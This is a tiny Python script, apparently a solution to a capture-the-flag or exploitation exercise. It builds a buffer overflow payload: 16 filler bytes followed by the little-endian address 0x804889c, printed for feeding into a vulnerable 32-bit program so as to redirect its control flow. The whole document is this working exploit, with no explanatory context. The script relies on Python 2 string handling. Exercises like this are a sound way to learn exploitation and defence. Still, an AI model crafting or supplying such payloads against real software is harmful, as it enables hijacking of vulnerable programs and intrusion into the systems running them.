from struct import pack
address = pack("<I", 0x804889c)
print("C"*16 + address)